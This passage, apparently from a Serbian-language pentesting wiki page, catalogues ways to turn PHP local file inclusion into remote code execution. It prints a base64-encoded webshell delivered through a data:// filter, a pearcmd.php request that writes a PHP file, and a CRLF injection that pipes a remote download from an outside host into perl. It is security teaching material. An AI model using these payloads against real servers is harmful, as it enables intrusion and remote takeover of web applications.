Kao što je prikazano u [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) članku, PHP base64 filter ignoriše non-base64. To možete iskoristiti da zaobiđete proveru ekstenzije fajla: ako pošaljete base64 koji se završava sa ".php", filter će jednostavno ignorisati "." i pripojiće "php" base64-u. Evo primera payload-a:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Preko php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objašnjava da možete koristiti **php filters to generate arbitrary content** kao izlaz. Što u suštini znači da možete **generate arbitrary php code** za include **without needing to write** ga u fajl.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Preko segmentation fault

**Upload** fajl koji će biti sačuvan kao **temporary** u `/tmp`, zatim u **isti request,** izazovite **segmentation fault**, i onda **temporary file won't be deleted** i možete ga potražiti.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Preko Nginx temp file storage

Ako pronađete **Local File Inclusion** i **Nginx** radi ispred PHP, možda ćete moći da dobijete RCE sa sledećom tehnikom:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Preko PHP_SESSION_UPLOAD_PROGRESS

Ako pronađete **Local File Inclusion** čak i ako **nemate a session** i `session.auto_start` je `Off`. Ako u multipart POST podacima pošaljete **`PHP_SESSION_UPLOAD_PROGRESS`**, PHP će **enable the session for you**. Možete ovo iskoristiti da dobijete RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Preko temp file uploads in Windows

Ako pronađete **Local File Inclusion** i server radi na **Windows** možda možete dobiti RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Preko `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skripta `/usr/local/lib/phppearcmd.php` postoji po defaultu u php docker images. Štaviše, moguće je proslediti argumente skripti preko URL-a zato što je naznačeno da ako URL param nema `=`, treba da se koristi kao argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Sledeći primer zloupotrebljava CRLF vuln da bi se dobio RCE (iz [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Preko phpinfo() (file_uploads = on)

Ako ste pronašli **Local File Inclusion** i fajl koji izlaže **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Preko compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako ste pronašli **Local File Inclusion** i možete **exfiltrate the path** privremenog fajla, ALI **server** proverava da li **file to be included has PHP marks**, možete pokušati da **bypass that check** ovom **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Preko eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da **hang** PHP izvršavanje, onda možete **brute force filenames during hours** kako biste pronašli privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error

Ako include-ujete bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Treba da include-ujete isti fajl 2 puta da biste izazvali tu grešku).

**Ne znam koliko je ovo korisno, ali možda jeste.**\
_Čak i ako izazovete PHP Fatal Error, PHP temporary files koji su upload-ovani se brišu._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
